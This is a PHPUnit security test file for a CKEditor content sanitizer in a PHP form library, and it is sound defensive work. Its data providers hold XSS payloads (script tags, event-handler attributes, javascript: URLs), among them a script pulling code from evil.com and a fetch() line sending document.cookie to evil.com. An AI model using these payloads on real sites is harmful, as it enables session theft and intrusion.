<?php

namespace Canvastack\Canvastack\Tests\Feature\Components\Form\Features\Editor;

use Canvastack\Canvastack\Components\Form\Features\Editor\CKEditorIntegration;
use Canvastack\Canvastack\Components\Form\Features\Editor\ContentSanitizer;
use Canvastack\Canvastack\Components\Form\Features\Editor\EditorConfig;
use PHPUnit\Framework\TestCase;

/**
 * Security Tests: Content Sanitization.
 *
 * Tests XSS prevention, dangerous attribute removal, and safe HTML preservation.
 *
 * **Validates: Requirements 4.15, 4.16, 14.8**
 */
class ContentSanitizationSecurityTest extends TestCase
{
    protected ContentSanitizer $sanitizer;

    protected CKEditorIntegration $integration;

    protected function setUp(): void
    {
        parent::setUp();

        $this->sanitizer = new ContentSanitizer();
        $this->integration = new CKEditorIntegration(
            new EditorConfig(),
            $this->sanitizer
        );
    }

    /**
     * Test: XSS script tags are removed.
     *
     * @test
     * @dataProvider xssScriptTagProvider
     */
    public function test_xss_script_tags_are_removed(string $maliciousHtml, string $description): void
    {
        $sanitized = $this->sanitizer->clean($maliciousHtml);

        $this->assertStringNotContainsStringIgnoringCase(
            '<script',
            $sanitized,
            "Script tag was not removed: {$description}"
        );
        $this->assertStringNotContainsStringIgnoringCase(
            '</script>',
            $sanitized,
            "Script closing tag was not removed: {$description}"
        );
        $this->assertStringNotContainsStringIgnoringCase(
            'alert(',
            $sanitized,
            "JavaScript code was not removed: {$description}"
        );
    }

    /**
     * Data provider for XSS script tag tests.
     */
    public static function xssScriptTagProvider(): array
    {
        return [
            'basic_script' => [
                '<script>alert("XSS")</script>',
                'Basic script tag',
            ],
            'script_with_type' => [
                '<script type="text/javascript">alert("XSS")</script>',
                'Script tag with type attribute',
            ],
            'script_with_src' => [
                '<script src="https://evil.com/malicious.js"></script>',
                'Script tag with external source',
            ],
            'uppercase_script' => [
                '<SCRIPT>alert("XSS")</SCRIPT>',
                'Uppercase script tag',
            ],
            'mixed_case_script' => [
                '<ScRiPt>alert("XSS")</ScRiPt>',
                'Mixed case script tag',
            ],
            'script_with_content' => [
                '<p>Safe content</p><script>alert("XSS")</script><p>More content</p>',
                'Script tag mixed with safe content',
            ],
            'nested_script' => [
                '<div><p><script>alert("XSS")</script></p></div>',
                'Nested script tag',
            ],
            'multiple_scripts' => [
                '<script>alert("XSS1")</script><script>alert("XSS2")</script>',
                'Multiple script tags',
            ],
        ];
    }

    /**
     * Test: Dangerous event handler attributes are removed.
     *
     * @test
     * @dataProvider dangerousAttributeProvider
     */
    public function test_dangerous_attributes_are_removed(string $maliciousHtml, string $attribute, string $description): void
    {
        $sanitized = $this->sanitizer->clean($maliciousHtml);

        $this->assertDoesNotMatchRegularExpression(
            "/{$attribute}\s*=/i",
            $sanitized,
            "Dangerous attribute '{$attribute}' was not removed: {$description}"
        );
    }

    /**
     * Data provider for dangerous attribute tests.
     */
    public static function dangerousAttributeProvider(): array
    {
        return [
            'onclick' => [
                '<a href="#" onclick="alert(\'XSS\')">Click me</a>',
                'onclick',
                'onclick event handler',
            ],
            'onerror' => [
                '<img src="invalid.jpg" onerror="alert(\'XSS\')">',
                'onerror',
                'onerror event handler',
            ],
            'onload' => [
                '<body onload="alert(\'XSS\')">Content</body>',
                'onload',
                'onload event handler',
            ],
            'onmouseover' => [
                '<div onmouseover="alert(\'XSS\')">Hover me</div>',
                'onmouseover',
                'onmouseover event handler',
            ],
            'onfocus' => [
                '<input type="text" onfocus="alert(\'XSS\')">',
                'onfocus',
                'onfocus event handler',
            ],
            'onchange' => [
                '<select onchange="alert(\'XSS\')"><option>1</option></select>',
                'onchange',
                'onchange event handler',
            ],
            'onsubmit' => [
                '<form onsubmit="alert(\'XSS\')"><input type="submit"></form>',
                'onsubmit',
                'onsubmit event handler',
            ],
            'onkeypress' => [
                '<input type="text" onkeypress="alert(\'XSS\')">',
                'onkeypress',
                'onkeypress event handler',
            ],
        ];
    }

    /**
     * Test: JavaScript protocol in URLs is removed.
     *
     * @test
     * @dataProvider javascriptProtocolProvider
     */
    public function test_javascript_protocol_is_removed(string $maliciousHtml, string $description): void
    {
        $sanitized = $this->sanitizer->clean($maliciousHtml);

        $this->assertStringNotContainsStringIgnoringCase(
            'javascript:',
            $sanitized,
            "JavaScript protocol was not removed: {$description}"
        );
    }

    /**
     * Data provider for JavaScript protocol tests.
     */
    public static function javascriptProtocolProvider(): array
    {
        return [
            'link_javascript' => [
                '<a href="javascript:alert(\'XSS\')">Click me</a>',
                'JavaScript protocol in link href',
            ],
            'link_javascript_uppercase' => [
                '<a href="JAVASCRIPT:alert(\'XSS\')">Click me</a>',
                'Uppercase JavaScript protocol',
            ],
            'link_javascript_void' => [
                '<a href="javascript:void(0)">Click me</a>',
                'JavaScript void protocol',
            ],
            'img_javascript' => [
                '<img src="javascript:alert(\'XSS\')">',
                'JavaScript protocol in image src',
            ],
        ];
    }

    /**
     * Test: Safe HTML content is preserved.
     *
     * @test
     * @dataProvider safeHtmlProvider
     */
    public function test_safe_html_is_preserved(string $safeHtml, array $expectedElements, string $description): void
    {
        $sanitized = $this->sanitizer->clean($safeHtml);

        foreach ($expectedElements as $element) {
            $this->assertStringContainsString(
                $element,
                $sanitized,
                "Safe element '{$element}' was removed: {$description}"
            );
        }
    }

    /**
     * Data provider for safe HTML tests.
     */
    public static function safeHtmlProvider(): array
    {
        return [
            'paragraph' => [
                '<p>This is a safe paragraph.</p>',
                ['<p>', 'safe paragraph', '</p>'],
                'Basic paragraph',
            ],
            'formatted_text' => [
                '<p>This is <strong>bold</strong> and <em>italic</em> text.</p>',
                ['<strong>', 'bold', '<em>', 'italic'],
                'Text with formatting',
            ],
            'headings' => [
                '<h1>Heading 1</h1><h2>Heading 2</h2><h3>Heading 3</h3>',
                ['<h1>', '<h2>', '<h3>'],
                'Multiple heading levels',
            ],
            'lists' => [
                '<ul><li>Item 1</li><li>Item 2</li></ul>',
                ['<ul>', '<li>', 'Item 1', 'Item 2'],
                'Unordered list',
            ],
            'links' => [
                '<a href="https://example.com" title="Example">Visit Example</a>',
                ['<a', 'href="https://example.com"', 'title="Example"'],
                'Safe link with attributes',
            ],
            'images' => [
                '<img src="image.jpg" alt="Description" width="100" height="100">',
                ['<img', 'src="image.jpg"', 'alt="Description"'],
                'Image with safe attributes',
            ],
            'tables' => [
                '<table><tr><th>Header</th></tr><tr><td>Data</td></tr></table>',
                ['<table>', '<tr>', '<th>', '<td>'],
                'Table structure',
            ],
        ];
    }

    /**
     * Test: Complex XSS attack vectors are neutralized.
     *
     * @test
     * @dataProvider complexXssProvider
     */
    public function test_complex_xss_attacks_are_neutralized(string $maliciousHtml, string $description): void
    {
        $sanitized = $this->sanitizer->clean($maliciousHtml);

        // Should not contain any script tags
        $this->assertStringNotContainsStringIgnoringCase('<script', $sanitized);

        // Should not contain event handlers
        $this->assertDoesNotMatchRegularExpression('/\bon\w+\s*=/i', $sanitized);

        // Should not contain javascript: protocol
        $this->assertStringNotContainsStringIgnoringCase('javascript:', $sanitized);

        // Should not contain alert() calls
        $this->assertStringNotContainsStringIgnoringCase('alert(', $sanitized);
    }

    /**
     * Data provider for complex XSS attack tests.
     */
    public static function complexXssProvider(): array
    {
        return [
            'img_onerror' => [
                '<img src="x" onerror="alert(\'XSS\')">',
                'Image with onerror handler',
            ],
            'svg_onload' => [
                '<svg onload="alert(\'XSS\')"></svg>',
                'SVG with onload handler',
            ],
            'iframe_javascript' => [
                '<iframe src="javascript:alert(\'XSS\')"></iframe>',
                'Iframe with JavaScript protocol',
            ],
            'object_data' => [
                '<object data="javascript:alert(\'XSS\')"></object>',
                'Object with JavaScript data',
            ],
            'embed_src' => [
                '<embed src="javascript:alert(\'XSS\')">',
                'Embed with JavaScript source',
            ],
            'form_action' => [
                '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
                'Form with JavaScript action',
            ],
            'meta_refresh' => [
                '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
                'Meta refresh with JavaScript',
            ],
            'link_import' => [
                '<link rel="import" href="javascript:alert(\'XSS\')">',
                'Link import with JavaScript',
            ],
        ];
    }

    /**
     * Test: stripTags method removes all HTML.
     *
     * @test
     */
    public function test_strip_tags_removes_all_html(): void
    {
        $html = '<p>This is <strong>formatted</strong> text with <a href="#">a link</a>.</p>';

        $stripped = $this->sanitizer->stripTags($html);

        $this->assertStringNotContainsString('<p>', $stripped);
        $this->assertStringNotContainsString('<strong>', $stripped);
        $this->assertStringNotContainsString('<a', $stripped);
        $this->assertStringContainsString('This is formatted text with a link.', $stripped);
    }

    /**
     * Test: stripTags also sanitizes before stripping.
     *
     * @test
     */
    public function test_strip_tags_sanitizes_before_stripping(): void
    {
        $maliciousHtml = '<p>Safe text</p><script>alert("XSS")</script>';

        $stripped = $this->sanitizer->stripTags($maliciousHtml);

        // Should not contain script content
        $this->assertStringNotContainsString('alert', $stripped);
        $this->assertStringNotContainsString('XSS', $stripped);

        // Should contain safe text
        $this->assertStringContainsString('Safe text', $stripped);
    }

    /**
     * Test: CKEditorIntegration sanitize method works correctly.
     *
     * @test
     */
    public function test_integration_sanitize_method(): void
    {
        $maliciousHtml = '<p>Safe content</p><script>alert("XSS")</script>';

        $sanitized = $this->integration->sanitize($maliciousHtml);

        $this->assertStringNotContainsStringIgnoringCase('<script', $sanitized);
        $this->assertStringContainsString('<p>Safe content</p>', $sanitized);
    }

    /**
     * Test: Custom allowed tags configuration.
     *
     * @test
     */
    public function test_custom_allowed_tags(): void
    {
        // Create sanitizer with custom configuration
        $sanitizer = new ContentSanitizer([
            'HTML.Allowed' => 'p,strong',
        ]);

        $html = '<p>Text with <strong>bold</strong> and <em>italic</em> and <script>alert("XSS")</script>.</p>';
        $sanitized = $sanitizer->clean($html);

        // Should preserve allowed tags
        $this->assertStringContainsString('<p>', $sanitized);
        $this->assertStringContainsString('<strong>', $sanitized);

        // Should remove dangerous tags
        $this->assertStringNotContainsStringIgnoringCase('<script', $sanitized);

        // Should preserve text content
        $this->assertStringContainsString('Text with', $sanitized);
        $this->assertStringContainsString('bold', $sanitized);
        $this->assertStringContainsString('italic', $sanitized);
    }

    /**
     * Test: Strip all HTML configuration.
     *
     * @test
     */
    public function test_strip_all_factory_method(): void
    {
        // Create sanitizer that strips all HTML
        $sanitizer = new ContentSanitizer([
            'HTML.Allowed' => '',
        ]);

        $html = '<p>Text with <strong>formatting</strong> and <script>alert("XSS")</script>.</p>';
        $sanitized = $sanitizer->clean($html);

        // Should remove dangerous content
        $this->assertStringNotContainsStringIgnoringCase('<script', $sanitized);
        $this->assertStringNotContainsStringIgnoringCase('alert', $sanitized);

        // Should preserve text content
        $this->assertStringContainsString('Text with', $sanitized);
        $this->assertStringContainsString('formatting', $sanitized);
    }

    /**
     * Test: Real-world CKEditor content sanitization.
     *
     * @test
     */
    public function test_real_world_ckeditor_content(): void
    {
        $editorContent = <<<HTML
        <h1>Article Title</h1>
        <p>This is the introduction paragraph with <strong>bold text</strong>.</p>
        <script>
            // Malicious script injected by attacker
            fetch('https://evil.com/steal?data=' + document.cookie);
        </script>
        <p>Here is a <a href="https://example.com" onclick="trackClick()">safe link</a>.</p>
        <img src="image.jpg" alt="Article image" onerror="alert('XSS')">
        <ul>
            <li>List item 1</li>
            <li>List item 2 <script>alert('XSS')</script></li>
        </ul>
        <table>
            <tr>
                <th>Column 1</th>
                <th onload="malicious()">Column 2</th>
            </tr>
            <tr>
                <td>Data 1</td>
                <td>Data 2</td>
            </tr>
        </table>
        HTML;

        $sanitized = $this->sanitizer->clean($editorContent);

        // Malicious content should be removed
        $this->assertStringNotContainsStringIgnoringCase('<script', $sanitized);
        $this->assertStringNotContainsStringIgnoringCase('fetch(', $sanitized);
        $this->assertDoesNotMatchRegularExpression('/\bon\w+\s*=/i', $sanitized);

        // Safe content should be preserved
        $this->assertStringContainsString('<h1>Article Title</h1>', $sanitized);
        $this->assertStringContainsString('<strong>bold text</strong>', $sanitized);
        $this->assertStringContainsString('<a href="https://example.com"', $sanitized);
        $this->assertStringContainsString('<img', $sanitized);
        $this->assertStringContainsString('src="image.jpg"', $sanitized);
        $this->assertStringContainsString('<ul>', $sanitized);
        $this->assertStringContainsString('<table>', $sanitized);
    }

    /**
     * Test: Empty and whitespace-only input.
     *
     * @test
     */
    public function test_empty_input_handling(): void
    {
        $this->assertEmpty($this->sanitizer->clean(''));
        $this->assertEmpty(trim($this->sanitizer->clean('   ')));
        $this->assertEmpty(trim($this->sanitizer->clean("\n\t")));
    }

    /**
     * Test: Unicode and special characters are preserved.
     *
     * @test
     */
    public function test_unicode_characters_are_preserved(): void
    {
        $html = '<p>Unicode: 你好世界 🌍 Émojis: 😀 Special: © ® ™</p>';

        $sanitized = $this->sanitizer->clean($html);

        $this->assertStringContainsString('你好世界', $sanitized);
        $this->assertStringContainsString('🌍', $sanitized);
        $this->assertStringContainsString('😀', $sanitized);
        $this->assertStringContainsString('©', $sanitized);
    }
}
